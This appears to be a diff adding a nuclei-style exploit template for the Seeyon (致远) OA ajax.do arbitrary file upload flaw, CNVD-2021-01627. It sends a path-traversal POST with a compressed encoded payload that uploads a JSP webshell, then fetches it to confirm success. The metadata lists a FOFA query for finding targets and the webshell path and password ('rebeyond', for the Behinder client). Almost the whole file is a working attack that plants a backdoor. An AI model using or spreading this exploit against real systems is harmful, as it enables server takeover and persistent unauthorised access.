@@ -1,0 +1,54 @@
+id: poc-local-oa-seeyon-ajax-fileupload-CNVD-2021-01627
+
+info:
+  name: 致远OA-ajax.do-任意文件上传漏洞-CNVD-2021-01627
+  author: capiton
+  severity: critical
+  description: 致远OA-ajax.do-任意文件上传漏洞-CNVD-2021-01627
+  reference:
+    - 
+  metadata:
+    fofa-query: app="致远互联-OA"
+    Vulnerability-Impact: unknown
+    webshell: "webshell地址：url + /seeyon/42eba8969c8cb5168bc15b6bf994a744.jspx 密码：rebeyond 冰蝎3"
+  tags: seeyon,zhiyuan
+
+requests:
+  - raw:
+      - |-
+        POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip  HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Sec-Fetch-Site: none
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: application/x-www-form-urlencoded
+
+        managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%03uT%5B%C2%93%C2%AAF%10%7EN%7E%05%C3%A5%C2%8Bn%C3%AD%C2%89%C2%8B%28%2A9%C2%95%C2%87%C3%B5%C2%86%C2%88%C2%A2%C2%82rK%C3%A5%C2%81%C2%99A.%C3%8E%00%C2%91%C2%8B%C3%A0%C3%96%C3%B9%C3%AF%19%C3%84%C3%8D%C3%AE%C2%A9l%C3%A6e%C2%BA%7B%C2%BA%C2%BF%C2%BEN%C3%BF%C3%B9%C3%96%3E%C3%85%17%C2%92c%C3%A7P%25n%C3%BBw%C2%A6%C3%B7%C2%8Dy%C2%97%28%0E%C2%A9%25%C3%AD%C3%8CM%C2%B3%C3%B6%C2%87x%5E%26%177M%C2%838%C2%AA%1F%C2%B5%C3%AC%12D%1E%C2%938%C2%99%C3%8F%C3%BC%C3%81%C2%B4%C2%BA%C3%9D%C2%97%C2%AB%0B%C2%9C%24I_R%C3%97%C2%AD%C3%A2%C3%A8%C2%A5%C3%B5%C3%BDW%C2%A69%C2%BF%C2%84N%C3%A1t%C2%83%C2%B8%C2%BB%C2%A3%26%C2%99q%092%C3%B7%C3%82%24%1F4G%01%22%C3%B7%C3%8A%7C%C2%A1%C3%96%C2%A9%C3%B1%C2%9F%5B%03%C2%8Eb%C2%8F%C2%85%C2%A1%00%C3%87%10%C3%B0%C2%BD%C3%A1%18%C3%80%1E%0F%C2%86%C3%A0%24%08%03g4%18t%C3%834%29%5BO%C3%BFzd%1E%C3%91%C2%A5%C2%BE%C2%8Bq%1D%C3%9ENLnp%C2%96T%C2%80%13Xi%C3%A9g%40%C3%A4o%5BR%C3%8B%C3%98%C3%80Y%C2%AA%2C%C2%9C%C3%85%C3%85%C2%9AK%7CD%C3%A69%C3%AC%C3%AB%C3%B9%C2%9A%28%05%C3%90%04%C3%B9%C3%98%7B-%C2%8E%C3%A2%22%C2%B25%C3%89CD%C2%AF+%C2%87%0B%10%C2%B2%C3%81F%1BTR8%18%3B%C2%91r%C3%9D%125%C2%81D%0F%C2%91%C2%889%5B%C3%A3%C2%AF%C2%96%C2%81%C2%B0%24%C3%A2%0C%C2%8AB%C2%85j%7C%C2%B2%C3%A0%2C%C2%8D%C3%AF%C3%91%C3%B7t%1D%C3%84%C3%A9%C2%9D7%C2%BD%C3%9C%C3%AA%C2%AFx%C2%B8T%C2%8B%2Fe%14%C3%9766%C2%B9%1CH%C3%85.%2C%C3%BF%C2%86%C3%BD%C3%97%C2%A1-%C3%AA%21%10%17%C2%95e%C2%AA%09%C3%A0%06%C3%8F%C2%92%C2%A8%C2%A4%C2%96%C2%A9%C3%9C%C2%A4%C3%85%C3%91%C2%B3M%C2%9F%C2%B5%0D%C3%BE%0C%C2%AB%C3%89%C2%8C%C3%AA%C3%9C+%5B%16%C2%96%C2%A1b%18e%C2%BA%3Co%C3%B4%0E%C2%A2%C3%A0S%C2%8CJ%127%C2%89%C3%9BWz%C2%90%C3%922%C2%A5%C2%B7%C3%BD%C3%9E%15%19%C2%AB%C3%9416%C3%9E%C2%9E%2B%7D%C3%98%C3%9Fxv%C3%A5%07%C2%AE%C2%A9bi%C2%91%21%2B%C3%80%23%C2%9A%1F%C2%8B%C3%8CU.-%1B%C2%BB5Q%C2%B1Mpn%1F%1BlY%C2%94%C3%92%C3%8D%C2%B4%0C%C3%96%C2%A4%C3%84%C2%80+%C3%96%C2%99%C2%9EG%27%C2%93%1D%C3%93%C2%9A%C3%96u%3F%C3%9BF%C2%AD%C2%B7%C3%B2i%0Dh%C3%BD%1Eu%C2%8B%C2%94%10%12%7CEb%C2%89%C3%91%C2%8C%3F%C2%A0%C3%A5%2A%01%04z%C3%8E%C2%8D%0D%C3%AC%C3%83%C2%BEg%1F6%C3%95%C3%96%C2%B0%C2%B1%15%C3%AA%C3%A7%C3%ADA%C3%AAY%C2%814%C2%82%C2%9C%7E%C2%BB%C3%B7+%C3%A0%C2%AF%C3%88T%0D%C3%8B%28%7B%C2%B6%C3%A6%05H%C2%93R%C2%A7%3A%C2%8F%C3%B6%1C%C2%BE%3AM%C2%8E%C3%82%3B%C2%BD%26%08%C2%A39%C2%A6%7DU%7D%40%14%2COW%13U%C3%9F%04%C3%B2%21%0B%C3%974%07%C3%87%C3%9C%C3%87%C2%9B%C2%A0%C3%8Cm%13zGN%0F%C3%AB%5C5N%C3%A7%C2%8F%C3%BD%09%C2%B6%2A%2F%C3%BE%C3%A43%C2%B2%7F%C3%B6%C2%99%C3%88%C2%95%14%C3%88%C3%9A%5D%3E%C2%AD%C3%AB%05%2B%2FY%C2%BF%C3%A3k%C3%A7%11+z%C2%9F%C3%B6%27F%C2%A2%C2%9F%C3%80%C3%AA%C2%AE%C3%97%C3%B4%C2%A7%C3%96%C2%BB%C3%87%C3%B5so%C3%A4%C3%A9%C2%99%C3%8AalU%C3%BC%19%C2%B06%C2%AD%C3%87%22%C2%95E%1E%C2%A3jrC%C3%86+%07%06%C2%BE%C3%91%C2%B7%C3%A9%5EW%16J%C2%A8%C3%8Ei%5D%C2%8B%C2%87%5D%7E%C2%9F%0FN%C3%85%C3%BBH%276%C2%9DUy%C2%B9%C3%82%C3%90%C3%941%C3%AC%C3%AFs%C2%9B%C3%93%C3%99%23%C3%91%C3%9F%7D%C3%A4%C2%B0%C2%A6%C3%A9%C2%87%06%C3%A4%18%C3%938%13%C2%9A%03%C3%8D%1F%C2%AD%40%C2%A4%C2%B0%C2%96%C3%81%C2%874%3F%1A%C2%87%5E%22c%C2%91%C3%82%C3%8A%C2%BF%C3%8F%C3%B4%C2%9E%13r%24%C3%AA%03D%7B%C2%BB%C2%9B%0A%C3%B7%C2%99%C2%84%C2%9CR9%C3%A6%C2%84%05%C2%A2%C3%8E%C3%AE%C3%82k%C3%91%C3%B4uU%C2%80%C3%BE%C3%BE%C3%B9c%010i%1EuI%C2%90%C3%82%C3%AE%C3%A4U%C2%9B%0F%073%17%C3%86%C2%88%C3%AE%00%C3%B4%C2%B8%C2%9B%C3%AF%C3%BF%C2%B5R%C3%A7%C2%BF%C2%BF%C2%BA1%7B0%C2%8Dm%C3%83t%1E%C2%80%C3%9D%C3%A6%C2%9E%C3%A4%C2%A7%13%05%C2%B8%2F%C2%81%C2%A7o%C2%AD%C3%A3a%C3%B1%C3%9B%C3%B8%C3%B3%C2%92%C3%B8%C2%BC%C2%82%C2%BAw%06G%C2%9D%C3%8F%C3%A0%C3%BF%C2%A7%0Bq%C2%9C%C2%BA4%C2%B0%1F%C3%9F%C3%AB%15I%09%C3%A4%C2%9E%C2%984s%C2%B2%002eYv%C2%9E%C3%9E%C3%9A%3F%C3%A8%C3%9E%C2%A4%C2%BB%C3%B3%C2%AD%C2%BE%C2%B3K%C3%AE%C2%B6%C3%BF%C3%BA%07%C3%A8%60p%12r%05%00%00
+      
+      - |-
+        GET /seeyon/42eba8969c8cb5168bc15b6bf994a744.jspx  HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    req-condition: true
+    matchers:
+      - type: dsl
+        name: code
+        dsl:
+          - "status_code_2 == 200 "
+          - "status_code_2 == 500 "
+        condition: or
+
+      - type: dsl
+        name: upload
+        dsl:
+          - contains(body_1, "\"message\":null")
+          - contains(body_1, "\"details\":null")
+        condition: and
